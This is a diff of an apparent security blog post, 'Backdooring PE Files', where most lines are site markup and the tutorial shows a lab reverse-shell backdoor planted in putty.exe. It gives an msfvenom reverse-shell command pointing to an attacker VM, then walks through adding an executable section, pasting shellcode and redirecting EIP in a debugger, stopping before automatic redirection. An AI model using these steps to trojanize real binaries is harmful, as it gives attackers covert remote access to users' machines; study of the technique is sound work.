@@ -1,291 +1,151 @@
-<!DOCTYPE html>
-<html lang="en" color-mode="dark">
-
-  <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="author" content="kagehayashi" />
-  <!-- Open Graph Description 简短摘要-->
-  
-  <!-- 用于搜索引擎的文章摘要 -->
-  
-  <meta name="description" content="shadow realm" />
-  
-  
-  
-  <title>
-    
-      Backdooring PE Files 
-      
-      
-      |
-    
-     SHADOW REALM
-  </title>
-
-  
-    <link rel="apple-touch-icon" href="/images/favicon.png">
-    <link rel="icon" href="/images/favicon.png">
-  
-
-  <!-- Raleway-Font -->
-  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
-
-  <!-- hexo site css -->
-  <link rel="stylesheet" href="/css/main.css" />
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
-  <!-- 代码块风格 -->
-  
-
-  <!-- jquery3.3.1 -->
-  
-    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
-  
-
-  <!-- fancybox -->
-  
-    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
-    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
-  
-  
-<script src="/js/fancybox.js"></script>
-
-
-  
-
-  
-
-  <script>
-    var html = document.documentElement
-    const colorMode = localStorage.getItem('color-mode')
-    if (colorMode) {
-      document.documentElement.setAttribute('color-mode', colorMode)
-    }
-  </script>
-<meta name="generator" content="Hexo 7.3.0"><script src="/assets/js/DPlayer.min.js"></script></head>
-
-
-  <body>
-    <div id="app">
-      <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css?family=Kanit&display=swap" rel="stylesheet">
-
-<div class="header">
-  <div class="avatar">
-    <a href="/">
-      <!-- 头像取消懒加载，添加no-lazy -->
-      
-        <img id="author_photo" src="/images/dark.png" alt="">
-      
-    </a>
-    <div class="nickname"><a href="/">SHADOW_REALM</a></div>
-    <div class="sub-nickname">from the realm of shadows, we bring forth light</div>
-  </div>
-  <div class="navbar">
-    <ul>
-      
-        <li class="nav-item" data-path="/">
-          <a href="/">Home</a>
-        </li>
-      
-        <li class="nav-item" data-path="/archives/">
-          <a href="/archives/">Archives</a>
-        </li>
-      
-        <li class="nav-item" data-path="/tags/">
-          <a href="/tags/">Tags</a>
-        </li>
-      
-        <li class="nav-item" data-path="/cheatsheets/">
-          <a href="/cheatsheets/">Cheatsheets</a>
-        </li>
-      
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
-    </ul>
-  </div>
-</div>
-
-
-<script src="/js/activeNav.js"></script>
-
-
-
-      <div class="flex-container">
-        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
-<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
-
-<link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
-
-
-  <!-- LaTex Display -->
-
-  
-    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
-  
-  <script>
-    MathJax = {
-      tex: {
-        inlineMath: [['$', '$'], ['\\(', '\\)']]
-      }
-    }
-  </script>
-
-
-
-
-
-  <!-- clipboard -->
-
-  
-    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
-  
-  
-<script src="/js/codeCopy.js"></script>
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
-  <div class="container post-details" id="post-details">
-    <div class="post-content">
-      <div class="post-title">Backdooring PE Files</div>
-      <div class="post-attach">
-        <span class="post-pubtime">
-          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2025-02-24 16:12:51
-        </span>
-        
-              <span class="post-tags">
-                <i class="iconfont icon-tags mr-10" title="Tags"></i>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/Malware/" title="Malware">
-                    #Malware
-                  </a>
-                </span>
-                
-              </span>
-          
-      </div>
-      <div class="markdown-body">
-        <p>This post is written to help me better understand the process of backdooring portable executables (PEs) by using “code caves” and redirecting execution flow. </p>
-<p>Inspiration came from <a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode</a>, but I’ll be using <code>putty.exe</code> as the target binary instead.</p>
-<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>In this post, we’ll be backdooring PEs through these high level steps:</p>
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/png" href="/favicon.png"><link rel="canonical" href="https://kagehayashi.com/posts/backdooring-pe-files/"><title>Backdooring PE Files — Shadow_Garden</title><meta name="description" content="A demostration of backdooring portable executable (PE) files by using code caves and redirecting execution flow."><meta name="author" content="KAGE"><meta property="og:title" content="Backdooring PE Files — Shadow_Garden"><meta property="og:description" content="A demostration of backdooring portable executable (PE) files by using code caves and redirecting execution flow."><meta property="og:type" content="website"><meta property="og:image" content="/sukuna.jpg"><meta property="og:url" content="https://kagehayashi.com/posts/backdooring-pe-files/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Backdooring PE Files — Shadow_Garden"><meta name="twitter:description" content="A demostration of backdooring portable executable (PE) files by using code caves and redirecting execution flow."><meta name="twitter:image" content="/sukuna.jpg"><link rel="alternate" type="application/rss+xml" title="Shadow_Garden" href="/rss.xml"><!-- Theme + settings: apply before render to prevent flash --><script>
+      (function () {
+        const theme = localStorage.getItem("theme");
+        if (theme === "light") {
+          document.documentElement.classList.add("light");
+        } else if (!theme) {
+          document.documentElement.classList.remove("light");
+        }
+        const gs = localStorage.getItem("img-greyscale");
+        if (gs === "off") {
+          document.documentElement.classList.add("no-greyscale");
+        }
+      })();
+    </script><link rel="stylesheet" href="/_astro/about.DUMstrtO.css"></head> <body class="min-h-screen bg-background scanlines"> <nav class="fixed top-0 left-0 right-0 z-40 border-b border-border bg-background/80 backdrop-blur-md unselectable"> <div class="container mx-auto flex items-center justify-between py-4 px-6"> <a href="/" class="flex items-center gap-3 group"> <div class="w-2 h-2 bg-foreground animate-flicker"></div> <span class="font-display text-xl tracking-[0.15em] text-primary uppercase font-semibold"> Shadow_Garden </span> </a> <div class="hidden md:flex items-center gap-1"> <a href="/" class="relative px-4 py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors group text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-1">01</span> <span class="text-scramble inline " data-text="feed"> <span class="inline-block">f</span><span class="inline-block">e</span><span class="inline-block">e</span><span class="inline-block">d</span> </span> <script type="module">const f="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*";document.querySelectorAll(".text-scramble").forEach(l=>{const e=l.dataset.text,a=l.querySelectorAll(":scope > span");let t=null,n=0;function h(){n=0;const c=e.length*3;t&&clearInterval(t),t=setInterval(()=>{n++;const i=n/c,u=Math.floor(i*e.length);a.forEach((r,o)=>{const s=e[o];s!==" "&&(o<u?r.textContent=s:r.textContent=f[Math.floor(Math.random()*f.length)])}),n>=c&&(t&&clearInterval(t),t=null,a.forEach((r,o)=>{r.textContent=e[o]}))},30)}l.addEventListener("mouseenter",()=>{h()})});</script> <span class="absolute bottom-0 left-1/2 -translate-x-1/2 h-px bg-primary transition-all duration-300 w-0 group-hover:w-full"></span> </a><a href="/archive" class="relative px-4 py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors group text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-1">02</span> <span class="text-scramble inline " data-text="archive"> <span class="inline-block">a</span><span class="inline-block">r</span><span class="inline-block">c</span><span class="inline-block">h</span><span class="inline-block">i</span><span class="inline-block">v</span><span class="inline-block">e</span> </span>  <span class="absolute bottom-0 left-1/2 -translate-x-1/2 h-px bg-primary transition-all duration-300 w-0 group-hover:w-full"></span> </a><a href="/tags" class="relative px-4 py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors group text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-1">03</span> <span class="text-scramble inline " data-text="tags"> <span class="inline-block">t</span><span class="inline-block">a</span><span class="inline-block">g</span><span class="inline-block">s</span> </span>  <span class="absolute bottom-0 left-1/2 -translate-x-1/2 h-px bg-primary transition-all duration-300 w-0 group-hover:w-full"></span> </a><a href="/tools" class="relative px-4 py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors group text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-1">04</span> <span class="text-scramble inline " data-text="tools"> <span class="inline-block">t</span><span class="inline-block">o</span><span class="inline-block">o</span><span class="inline-block">l</span><span class="inline-block">s</span> </span>  <span class="absolute bottom-0 left-1/2 -translate-x-1/2 h-px bg-primary transition-all duration-300 w-0 group-hover:w-full"></span> </a><a href="/cheatsheets" class="relative px-4 py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors group text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-1">05</span> <span class="text-scramble inline " data-text="cheatsheets"> <span class="inline-block">c</span><span class="inline-block">h</span><span class="inline-block">e</span><span class="inline-block">a</span><span class="inline-block">t</span><span class="inline-block">s</span><span class="inline-block">h</span><span class="inline-block">e</span><span class="inline-block">e</span><span class="inline-block">t</span><span class="inline-block">s</span> </span>  <span class="absolute bottom-0 left-1/2 -translate-x-1/2 h-px bg-primary transition-all duration-300 w-0 group-hover:w-full"></span> </a><a href="/about" class="relative px-4 py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors group text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-1">06</span> <span class="text-scramble inline " data-text="about"> <span class="inline-block">a</span><span class="inline-block">b</span><span class="inline-block">o</span><span class="inline-block">u</span><span class="inline-block">t</span> </span>  <span class="absolute bottom-0 left-1/2 -translate-x-1/2 h-px bg-primary transition-all duration-300 w-0 group-hover:w-full"></span> </a> </div> <!-- Right side controls --> <div class="flex items-center gap-3"> <!-- Command palette trigger (desktop) --> <button id="cmd-palette-btn" class="hidden md:flex items-center gap-2 px-3 py-1.5 border border-border/40 hover:border-primary/40 font-mono text-[10px] text-muted-foreground/50 hover:text-muted-foreground/80 transition-colors tracking-wider" aria-label="Open command palette"> <span>search...</span> <kbd class="text-[9px] text-muted-foreground/30 border border-border/30 px-1 py-0.5 leading-none">Ctrl+K</kbd> </button> <!-- Settings dropdown --> <div class="relative" id="settings-wrapper"> <button id="settings-btn" class="font-mono text-[10px] text-muted-foreground/50 hover:text-primary transition-colors tracking-wider px-2 py-1.5" aria-label="Open settings">
+▸ settings
+</button> <div id="settings-panel" class="hidden absolute right-0 top-full mt-2 w-52 border border-border bg-background/95 backdrop-blur-md z-50"> <!-- HUD corner accents --> <span class="absolute top-0 left-0 w-2 h-2 border-t border-l border-primary/30"></span> <span class="absolute top-0 right-0 w-2 h-2 border-t border-r border-primary/30"></span> <span class="absolute bottom-0 left-0 w-2 h-2 border-b border-l border-primary/30"></span> <span class="absolute bottom-0 right-0 w-2 h-2 border-b border-r border-primary/30"></span> <div class="p-3 space-y-1"> <div class="font-mono text-[9px] tracking-[0.3em] text-muted-foreground/40 uppercase mb-2">▸ preferences</div> <button id="setting-theme" class="w-full text-left px-2 py-1.5 font-mono text-[11px] tracking-wider text-muted-foreground hover:text-primary hover:bg-muted/30 transition-colors"> <span id="theme-label">◑ theme: dark</span> </button> <button id="setting-greyscale" class="w-full text-left px-2 py-1.5 font-mono text-[11px] tracking-wider text-muted-foreground hover:text-primary hover:bg-muted/30 transition-colors"> <span id="greyscale-label">▸ greyscale: on</span> </button> </div> </div> </div> <!-- Mobile menu button --> <button id="mobile-menu-btn" class="md:hidden font-mono text-xs text-muted-foreground tracking-widest uppercase hover:text-primary transition-colors" aria-label="Toggle menu">
+≡ menu
+</button> <div class="hidden md:block font-mono text-[10px] text-muted-foreground tracking-widest"> v2.077 </div> </div> </div> <!-- Mobile menu --> <div id="mobile-menu" class="hidden md:hidden border-t border-border bg-background/95 backdrop-blur-md"> <div class="container mx-auto px-6 py-4 space-y-1"> <a href="/" class="block py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-2">01</span> feed </a><a href="/archive" class="block py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-2">02</span> archive </a><a href="/tags" class="block py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-2">03</span> tags </a><a href="/tools" class="block py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-2">04</span> tools </a><a href="/cheatsheets" class="block py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-2">05</span> cheatsheets </a><a href="/about" class="block py-2 font-mono text-xs tracking-[0.2em] uppercase transition-colors text-muted-foreground hover:text-primary"> <span class="text-foreground/20 mr-2">06</span> about </a> </div> </div> </nav> <script type="module">function a(){const n=document.getElementById("mobile-menu-btn"),i=document.getElementById("mobile-menu");let t=!1;n?.addEventListener("click",()=>{t=!t,i?.classList.toggle("hidden",!t),n&&(n.textContent=t?"✕ close":"≡ menu")});const m=document.getElementById("settings-btn"),s=document.getElementById("settings-panel"),g=document.getElementById("settings-wrapper");m?.addEventListener("click",e=>{e.stopPropagation(),s?.classList.toggle("hidden")}),document.addEventListener("click",e=>{g?.contains(e.target)||s?.classList.add("hidden")}),document.addEventListener("keydown",e=>{e.key==="Escape"&&s?.classList.add("hidden")});const u=document.getElementById("setting-theme"),c=document.getElementById("theme-label");function o(){const e=document.documentElement.classList.contains("light");c&&(c.textContent=e?"◐ theme: light":"◑ theme: dark")}o(),u?.addEventListener("click",()=>{const e=document.documentElement.classList.toggle("light");localStorage.setItem("theme",e?"light":"dark"),o()});const r=document.getElementById("setting-greyscale"),d=document.getElementById("greyscale-label");function l(){const e=document.documentElement.classList.contains("no-greyscale");d&&(d.textContent=e?"▸ greyscale: off":"▸ greyscale: on")}l(),r?.addEventListener("click",()=>{const e=document.documentElement.classList.toggle("no-greyscale");localStorage.setItem("img-greyscale",e?"off":"on"),l()}),document.getElementById("cmd-palette-btn")?.addEventListener("click",()=>{document.dispatchEvent(new CustomEvent("open-command-palette"))})}a();document.addEventListener("astro:after-swap",a);</script>  <main class="pt-24 pb-20"> <div class="container mx-auto px-6"> <!-- Header --> <div class="mb-12">  <div> <a href="/" class="inline-flex items-center gap-2 font-mono text-[10px] tracking-[0.3em] text-muted-foreground hover:text-primary transition-colors uppercase mb-8 group"> <!-- <span>&larr;</span> --> <span class="inline-block w-4 h-px bg-current"></span> <span>back_to_feed</span> </a> <div class="flex flex-wrap items-center gap-x-4 gap-y-1 mb-4 mt-6"> <a href="/tags/malware" class="font-mono text-[10px] tracking-[0.3em] text-muted-foreground uppercase hover:text-primary transition-colors"> malware </a> <div class="w-1 h-1 bg-foreground/20 rotate-45"></div> <span class="font-mono text-[10px] text-muted-foreground"> 2024.03.09 </span> <div class="w-1 h-1 bg-foreground/20 rotate-45"></div> <span class="font-mono text-[10px] text-muted-foreground"> 7 min read </span> </div> <h1 class="font-display text-4xl md:text-5xl lg:text-6xl font-bold text-primary tracking-wider uppercase leading-tight"> Backdooring PE Files </h1> <p class="mt-4 font-mono text-base text-muted-foreground leading-relaxed max-w-2xl"> A demostration of backdooring portable executable (PE) files by using code caves and redirecting execution flow. </p> <div class="mt-4"> <div class="flex flex-wrap gap-2 "> <a href="/tags/malware" class="font-mono text-[9px] tracking-[0.2em] text-muted-foreground/60 hover:text-primary uppercase transition-colors border border-border/40 hover:border-foreground/30 px-2 py-1">
+#malware </a><a href="/tags/windows" class="font-mono text-[9px] tracking-[0.2em] text-muted-foreground/60 hover:text-primary uppercase transition-colors border border-border/40 hover:border-foreground/30 px-2 py-1">
+#windows </a><a href="/tags/c++" class="font-mono text-[9px] tracking-[0.2em] text-muted-foreground/60 hover:text-primary uppercase transition-colors border border-border/40 hover:border-foreground/30 px-2 py-1">
+#c++ </a> </div> </div> <div class="mt-6 h-px bg-border"></div> </div> </div> <!-- Content + TOC --> <div class="flex gap-12 relative"> <!-- Article --> <article class="flex-1 min-w-0 prose"> <blockquote>
+<p>This post is written to help me better understand the process of backdooring portable executables (PEs) by using &quot;code caves&quot; and redirecting execution flow.</p>
+<p>Inspiration from this post<sup><a href="#user-content-fn-1" id="user-content-fnref-1" data-footnote-ref aria-describedby="footnote-label">1</a></sup>, but I&#39;ll be using <code>putty.exe</code> as the target binary instead.</p>
+</blockquote>
+<dl class="not-prose my-6 space-y-4"> <div class="border-l border-border/40 pl-4"> <dt class="font-mono text-xs text-primary tracking-wider uppercase font-semibold"> Portable Executable (PE) </dt> <dd class="font-mono text-[11px] text-muted-foreground leading-[1.8] mt-1"> A file format for native executable code on 32-bit and 64-bit Windows operating systems, as well as in UEFI environments. It is used for native executables (.exe, .com), dynamic link libraries (.dll, .ocx), system drivers (.sys, .drv) and many other types of files. </dd> </div><div class="border-l border-border/40 pl-4"> <dt class="font-mono text-xs text-primary tracking-wider uppercase font-semibold"> Code cave </dt> <dd class="font-mono text-[11px] text-muted-foreground leading-[1.8] mt-1"> A series of unused bytes in a process&#39; memory. The code cave inside a process&#39;s memory is often a reference to a section that has capacity for injecting custom instructions. </dd> </div> </dl>
+<h2 id="intro">Intro</h2>
+<p>In this post, we&#39;ll be backdooring PEs through these high level steps:</p>
 <ul>
 <li>Manually introduce a code cave by adding a new PE section</li>
 <li>Add shellcode to our new PE section</li>
 <li>Patch execution flow of the PE to run the shellcode</li>
 <li>Give execution flow back to the PE after shellcode runs</li>
 </ul>
-<p>The last two steps are the most complicated and the whole process is easier said than done. </p>
-<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>We’ll be utilizing a Windows 10 victim VM and a Kali Linux attacker VM throughout the lab. Their respective IPs are listed below (noted for catching rev shells):</p>
+<p>The last two steps are the most complicated and the whole process is easier said than done.</p>
+<h2 id="tools">Tools</h2>
+<p>We&#39;ll be utilizing a Windows 10 victim VM and a Kali Linux attacker VM throughout the lab. Their respective IPs are listed below (noted for catching rev shells):</p>
 <ul>
 <li>Kali - <code>192.168.248.148</code></li>
 <li>Windows 10 - <code>192.168.248.150</code></li>
 </ul>
-<p>Here are the tools we’ll be using:</p>
+<p>Here are the tools we&#39;ll be using:</p>
 <ul>
 <li><code>msfvenom</code> - to generate shellcode</li>
-<li><code>CFF Explorer</code> - to manipulate PE sections</li>
-<li><code>HxD</code> - to patch our binary</li>
-<li><code>x32dbg</code> - to debug&#x2F;patch</li>
+<li><code>CFF Explorer</code> - to manipulate PE sections<sup><a href="#user-content-fn-2" id="user-content-fnref-2" data-footnote-ref aria-describedby="footnote-label">2</a></sup></li>
+<li><code>HxD</code> - to patch our binary<sup><a href="#user-content-fn-3" id="user-content-fnref-3" data-footnote-ref aria-describedby="footnote-label">3</a></sup></li>
+<li><code>x32dbg</code> - to debug/patch <sup><a href="#user-content-fn-4" id="user-content-fnref-4" data-footnote-ref aria-describedby="footnote-label">4</a></sup></li>
 </ul>
 <p>Our target PE of choice will be <code>putty.exe</code> - specifically the <code>32-bit x86</code> version, which can be downloaded from:</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></li>
+<li><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></li>
 </ul>
-<h1 id="Manual-Proof-of-Concept-POC"><a href="#Manual-Proof-of-Concept-POC" class="headerlink" title="Manual Proof-of-Concept (POC)"></a>Manual Proof-of-Concept (POC)</h1><p>Before we try to do any redirection of execution flow, let’s manually step through the theories of this technique: generating shellcode, placing it in a new PE section, and manually redirecting the EIP to our shellcode.</p>
-<h2 id="msfvenom-Shellcode"><a href="#msfvenom-Shellcode" class="headerlink" title="msfvenom Shellcode"></a>msfvenom Shellcode</h2><p>To begin, generate a simple reverse shell with <code>msfvenom</code>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.148 LPORT=8080 -o rev.exe</span><br></pre></td></tr></table></figure>
-
-<p>We’ll need to get the raw hex-bytes for later. This can be done using <code>xxd</code>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -l 1000 rev.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/backdooring-pe-files/image-20240310203628586.png"></p>
-<h2 id="Adding-a-New-PE-Section"><a href="#Adding-a-New-PE-Section" class="headerlink" title="Adding a New PE Section"></a>Adding a New PE Section</h2><p>Open <code>putty.exe</code> in CFF Explorer, navigate to <code>Section Headers</code>, and right-click to <code>Add Section (Empty Space)</code>. Make sure to make the size of the section at least 324 bytes - the size of our shellcode. Here, I’ll specify 200h - which is 512 bytes.</p>
-<p><img src="/posts/backdooring-pe-files/image-20240310151913464.png"></p>
-<p>I’ll rename the section to <code>.code</code> and right-click <code>Change Section Flags</code><br><img src="/posts/backdooring-pe-files/image-20240310152255772.png"></p>
-<p>Make sure that the section is readable, writeable, executable, and contains code.<br><img src="/posts/backdooring-pe-files/image-20240310152340682.png"></p>
+<h2 id="manual-proof-of-concept-poc">Manual Proof-of-Concept (POC)</h2>
+<p>Before we try to do any redirection of execution flow, let&#39;s manually step through the theories of this technique: generating shellcode, placing it in a new PE section, and manually redirecting the EIP to our shellcode.</p>
+<dl class="not-prose my-6 space-y-4"> <div class="border-l border-border/40 pl-4"> <dt class="font-mono text-xs text-primary tracking-wider uppercase font-semibold"> Extended Instruction Pointer (EIP) </dt> <dd class="font-mono text-[11px] text-muted-foreground leading-[1.8] mt-1"> A register in x86 architecture that holds the address of the next instruction to be executed by the CPU. </dd> </div> </dl>
+<h3 id="msfvenom-shellcode">msfvenom Shellcode</h3>
+<p>To begin, generate a simple reverse shell with <code>msfvenom</code>:</p>
+<pre class="astro-code astro-code-themes github-light-default github-dark-default" style="background-color:#ffffff;--shiki-dark-bg:#0d1117;color:#1f2328;--shiki-dark:#e6edf3;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#953800;--shiki-dark:#FFA657">msfvenom</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> -p</span><span style="color:#0A3069;--shiki-dark:#A5D6FF"> windows/shell_reverse_tcp</span><span style="color:#0A3069;--shiki-dark:#A5D6FF"> LHOST=</span><span style="color:#0550AE;--shiki-dark:#79C0FF">192.168.248.148</span><span style="color:#0A3069;--shiki-dark:#A5D6FF"> LPORT=</span><span style="color:#0550AE;--shiki-dark:#79C0FF">8080</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> -o</span><span style="color:#0A3069;--shiki-dark:#A5D6FF"> rev.exe</span></span></code></pre>
+<p>We&#39;ll need to get the raw hex-bytes for later. This can be done using <code>xxd</code>:</p>
+<pre class="astro-code astro-code-themes github-light-default github-dark-default" style="background-color:#ffffff;--shiki-dark-bg:#0d1117;color:#1f2328;--shiki-dark:#e6edf3;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#953800;--shiki-dark:#FFA657">xxd</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> -p</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> -l</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> 1000</span><span style="color:#0A3069;--shiki-dark:#A5D6FF"> rev.exe</span></span></code></pre>
+<p><img src="/images/backdooring-pe-files/image-20240310203628586.png" alt/></p>
+<h3 id="adding-a-new-pe-section">Adding a New PE Section</h3>
+<p>Open <code>putty.exe</code> in CFF Explorer, navigate to <code>Section Headers</code>, and right-click to <code>Add Section (Empty Space)</code>. Make sure to make the size of the section at least 324 bytes - the size of our shellcode. Here, I&#39;ll specify 200h - which is 512 bytes.</p>
+<p><img src="/images/backdooring-pe-files/image-20240310151913464.png" alt/></p>
+<p>I&#39;ll rename the section to <code>.code</code> and right-click <code>Change Section Flags</code>
+<img src="/images/backdooring-pe-files/image-20240310152255772.png" alt/></p>
+<p>Make sure that the section is readable, writeable, executable, and contains code.
+<img src="/images/backdooring-pe-files/image-20240310152340682.png" alt/></p>
 <p>Take note that the <code>Raw Address</code> of the section is <code>00166200</code> and make sure to save the changes.</p>
-<h2 id="Insert-Shellcode-into-New-Section"><a href="#Insert-Shellcode-into-New-Section" class="headerlink" title="Insert Shellcode into New Section"></a>Insert Shellcode into New Section</h2><p>From here, open the binary in <code>HxD</code>. Navigate to <code>Search -&gt; Go to...</code></p>
-<p><img src="/posts/backdooring-pe-files/image-20240310152743665.png"></p>
+<h3 id="insert-shellcode-into-new-section">Insert Shellcode into New Section</h3>
+<p>From here, open the binary in <code>HxD</code>. Navigate to <code>Search -&gt; Go to...</code></p>
+<p><img src="/images/backdooring-pe-files/image-20240310152743665.png" alt/></p>
 <p>Go to offset <code>00166200</code>, where our new section is.</p>
-<p><img src="/posts/backdooring-pe-files/image-20240310152827261.png"></p>
-<p>You should see an empty section of code.<br><img src="/posts/backdooring-pe-files/image-20240310152907463.png"></p>
-<p>We’ll insert our shellcode into this. Using the same <code>xxd</code> command before, copy the hex output.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -l 1000 rev.exe</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/backdooring-pe-files/image-20240310203837253.png"></p>
+<p><img src="/images/backdooring-pe-files/image-20240310152827261.png" alt/></p>
+<p>You should see an empty section of code.
+<img src="/images/backdooring-pe-files/image-20240310152907463.png" alt/></p>
+<p>We&#39;ll insert our shellcode into this. Using the same <code>xxd</code> command before, copy the hex output.</p>
+<pre class="astro-code astro-code-themes github-light-default github-dark-default" style="background-color:#ffffff;--shiki-dark-bg:#0d1117;color:#1f2328;--shiki-dark:#e6edf3;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#953800;--shiki-dark:#FFA657">xxd</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> -p</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> -l</span><span style="color:#0550AE;--shiki-dark:#79C0FF"> 1000</span><span style="color:#0A3069;--shiki-dark:#A5D6FF"> rev.exe</span></span></code></pre>
+<p><img src="/images/backdooring-pe-files/image-20240310203837253.png" alt/></p>
 <p>Right-click in <code>HxD</code> and <code>Paste write</code></p>
-<p><img src="/posts/backdooring-pe-files/image-20240310153045244.png"></p>
+<p><img src="/images/backdooring-pe-files/image-20240310153045244.png" alt/></p>
 <p>The newly pasted code section should be red. Make sure to save the changes.</p>
-<p><img src="/posts/backdooring-pe-files/image-20240310153106387.png"></p>
-<h2 id="Manually-Trigger-the-Shellcode"><a href="#Manually-Trigger-the-Shellcode" class="headerlink" title="Manually Trigger the Shellcode"></a>Manually Trigger the Shellcode</h2><p>Now that our shellcode is in the binary, let’s try to manually force it to execute in <code>x32dbg</code>. </p>
+<p><img src="/images/backdooring-pe-files/image-20240310153106387.png" alt/></p>
+<h3 id="manually-trigger-the-shellcode">Manually Trigger the Shellcode</h3>
+<p>Now that our shellcode is in the binary, let&#39;s try to manually force it to execute in <code>x32dbg</code>.</p>
 <p>Open the binary in <code>x32dbg</code> and navigate to <code>Memory Map</code>. We should see the <code>.code</code> section at <code>010DF000</code>. This address could have also been calculated by using the base address of <code>putty.exe</code> at <code>00F70000</code> and adding the relative virtual address of the <code>.code</code> section of <code>0016F000</code> to get <code>00F70000 + 0016F000 = 010DF000</code></p>
-<p><img src="/posts/backdooring-pe-files/image-20240310153626835.png"></p>
-<p>Double-click the section and if we follow it in dump, we should see the hex bytes of our shellcode.<br><img src="/posts/backdooring-pe-files/image-20240310154039487.png"></p>
+<p><img src="/images/backdooring-pe-files/image-20240310153626835.png" alt/></p>
+<p>Double-click the section and if we follow it in dump, we should see the hex bytes of our shellcode.
+<img src="/images/backdooring-pe-files/image-20240310154039487.png" alt/></p>
 <p>With everything in place, we can start a listener on our attacker machine, manually set the EIP to <code>010DF000</code> (1) and continue execution (2). We should see a reverse shell connect back (3).</p>
-<p><img src="/posts/backdooring-pe-files/image-20240310154355294.png"></p>
-<p>Here is the whole process in action:<br><img src="/posts/backdooring-pe-files/backdoor_pe.gif"></p>
-<p>We have successfully triggered the shellcode. Now, we know that the theories are in place and we have laid the groundworks for what’s coming next.</p>
-<h1 id="Execution-Redirection"><a href="#Execution-Redirection" class="headerlink" title="Execution Redirection"></a>Execution Redirection</h1><p>With the help of a debugger, we were able to manually trigger our shellcode. Now, we’ll attempt to patch the binary so that the shell triggers automatically and redirects execution back to <code>putty.exe</code></p>
